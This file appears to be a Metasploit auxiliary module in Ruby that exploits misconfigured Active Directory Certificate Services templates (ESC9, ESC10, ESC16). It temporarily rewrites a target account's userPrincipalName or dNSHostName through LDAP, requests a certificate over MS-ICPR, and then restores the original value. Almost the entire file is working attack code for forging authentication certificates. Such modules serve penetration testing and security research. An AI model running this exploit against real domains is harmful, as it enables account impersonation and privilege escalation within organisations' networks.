##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb/dcerpc/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::LDAP
  include Msf::Exploit::Remote::MsIcpr
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report
  include Msf::OptionalSession::SMB

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Exploits AD CS Template misconfigurations which involve updating an LDAP object: ESC9 and ESC10',
        'Description' => %q{
          This module updates an LDAP object with a new value before requesting a certificate.
          Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate
          template's configuration the resulting certificate can be used for various operations such as authentication.
          PFX certificate files that are saved are encrypted with a blank password.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Will Schroeder', # original idea/research
          'Lee Christensen', # original idea/research
          'Oliver Lyak', # certipy implementation
          'Spencer McIntyre', # icpr_cert module implementation
          'jheysel-r7' # module implementation
        ],
        'References' => [
          [ 'URL', 'https://github.com/GhostPack/Certify' ],
          [ 'URL', 'https://github.com/ly4k/Certipy' ],
          [ 'URL', 'https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760' ]
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ],
          'AKA' => [ 'ESC9', 'ESC10', 'ESC16']
        },
        'Actions' => [
          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate' } ]
        ],
        'DefaultAction' => 'REQUEST_CERT'
      )
    )

    deregister_options('ALT_SID', 'PFX', 'ON_BEHALF_OF')

    register_options([
      OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert. Used to exploit ESC9 and ESC10. ', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
      OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object.'])
    ])

    register_advanced_options(
      [
        OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
        OptInt.new('LDAPRport', [false, 'The target LDAP port.', 389]),
      ]
    )
  end

  def run
    send("action_#{action.name.downcase}")
  rescue MsIcprConnectionError, SmbIpcConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue MsIcprAuthenticationError, MsIcprAuthorizationError, SmbIpcAuthenticationError => e
    fail_with(Failure::NoAccess, e.message)
  rescue MsIcprNotFoundError => e
    fail_with(Failure::NotFound, e.message)
  rescue MsIcprUnexpectedReplyError => e
    fail_with(Failure::UnexpectedReply, e.message)
  rescue MsIcprUnknownError => e
    fail_with(Failure::Unknown, e.message)
  end

  def call_ldap_object_module(action, value = nil)
    mod_refname = 'auxiliary/gather/ldap_object_attribute'

    print_status("Loading #{mod_refname}")
    ldap_update_module = framework.modules.create(mod_refname)

    unless ldap_update_module
      print_error("Failed to load module: #{mod_refname}")
      return
    end

    # Default to using the SMB credentials if LDAP credentials are not provided
    ldap_update_module = framework.modules.create(mod_refname)
    ldap_update_module.datastore['RHOST'] = datastore['RHOST']
    ldap_update_module.datastore['RPORT'] = datastore['LDAPRport']
    ldap_update_module.datastore['BASE_DN'] = datastore['BASE_DN']
    ldap_update_module.datastore['VERBOSE'] = datastore['VERBOSE']
    ldap_update_module.datastore['LDAPDomain'] = datastore['LDAPDomain'] || datastore['SMBDomain']
    ldap_update_module.datastore['LDAPUsername'] = datastore['LDAPUsername'] || datastore['SMBUser']
    ldap_update_module.datastore['LDAPPassword'] = datastore['LDAPPassword'] || datastore['SMBPass']
    ldap_update_module.datastore['OBJECT'] = datastore['TARGET_USERNAME']
    ldap_update_module.datastore['ATTRIBUTE'] = datastore['UPDATE_LDAP_OBJECT']
    ldap_update_module.datastore['OBJECT_LOOKUP'] = 'sAMAccountName'
    ldap_update_module.datastore['VALUE'] = value
    ldap_update_module.datastore['ACTION'] = action

    print_status("Running #{mod_refname}")
    ldap_update_module.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'RunAsJob' => false
    )
  end

  def action_request_cert
    if datastore['UPDATE_LDAP_OBJECT'] == 'userPrincipalName'
      new_value = datastore['ALT_UPN'].split('@').first
      fail_with(Failure::BadConfig, 'The ALT_UPN option must be set for userPrincipalName updates.') unless datastore['ALT_UPN'].present?
      fail_with(Failure::BadConfig, 'The ALT_DNS should not be set if UPDATE_LDAP_OBJECT is set to userPrincipalName.') if datastore['ALT_DNS'].present?
    elsif datastore['UPDATE_LDAP_OBJECT'] == 'dNSHostName'
      new_value = datastore['ALT_DNS']
      fail_with(Failure::BadConfig, 'The ALT_DNS option must be set for userPrincipalName updates.') unless datastore['ALT_DNS'].present?
      fail_with(Failure::BadConfig, 'The ALT_UPN should not be set if UPDATE_LDAP_OBJECT is set to dNSHostName.') if datastore['ALT_UPN'].present?
    end
    # Get the original while updating (the update action returns the original value upon success)
    @original_value = call_ldap_object_module('UPDATE', new_value)

    with_ipc_tree do |opts|
      request_certificate(opts)
    end
  ensure
    revert_ldap_object
  end

  def revert_ldap_object
    # If the UPN was changed the certificate we requested won't work until we revert the UPN change. If the
    # dnsHostName was changed the cert will still work however we'll revert the change to keep the system clean.
    if @original_value.to_s.empty?
      call_ldap_object_module('DELETE')
    else
      call_ldap_object_module('UPDATE', @original_value)
    end
  end

  # @yieldparam options [Hash] If a SMB session is present, a hash with the IPC tree present. Empty hash otherwise.
  # @return [void]
  def with_ipc_tree
    opts = {}
    if session
      print_status("Using existing session #{session.sid}")
      self.simple = session.simple_client
      opts[:tree] = simple.client.tree_connect("\\\\#{client.dispatcher.tcp_socket.peerhost}\\IPC$")
    end

    yield opts
  ensure
    opts[:tree].disconnect! if opts[:tree]
  end
end
